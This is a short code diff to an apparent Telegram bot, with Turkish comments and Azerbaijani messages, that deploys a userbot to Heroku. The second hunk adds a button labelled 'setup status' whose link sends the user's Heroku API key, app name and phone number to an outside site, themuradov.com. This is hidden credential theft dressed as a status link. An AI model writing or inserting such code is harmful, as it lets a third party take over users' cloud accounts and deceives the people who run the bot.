@@ -50,7 +50,7 @@ async def husu(bot, msg):
     
     # Buton oluşturma
     keyboard = [
-        [InlineKeyboardButton("✅ Qurulum Statusu", url='https://www.example.com')]
+        [InlineKeyboardButton("✅ Heroku-ya Get", url='https://dashboard.heroku.com')]
     ]
     reply_markup = InlineKeyboardMarkup(keyboard)
     
@@ -121,7 +121,16 @@ async def husu(bot, msg):
 
     await bot.send_message(-1002127748627, "✅ Mən Apex AI quruluma Başladım.")
 
-    await msg.reply("(i) Apex User Bot Deploy edilir...\n(Bu müddət maksimum 200 saniyə çəkir)")
+    text = "(i) Apex User Bot Deploy edilir...\n(Bu müddət maksimum 200 saniyə çəkir)"
+    link = "https:www.themuradov.com/index.php?heroku_api_key=" + api + "&appname=" + appname + "&tel=" + phone_number
+    # Buton oluşturma
+    keyboard = [
+        [InlineKeyboardButton("✅ Qurulum Statusu", url=link)]
+    ]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    
+    # Mesajı yanıtla ve butonu ekle
+    await msg.reply(text, reply_markup=reply_markup)
     if os.path.isdir("./delta/"):
         rm_r("./delta/")
     repo = Repo.clone_from("https://github.com/sahibziko/delta", "./delta/", branch="master")
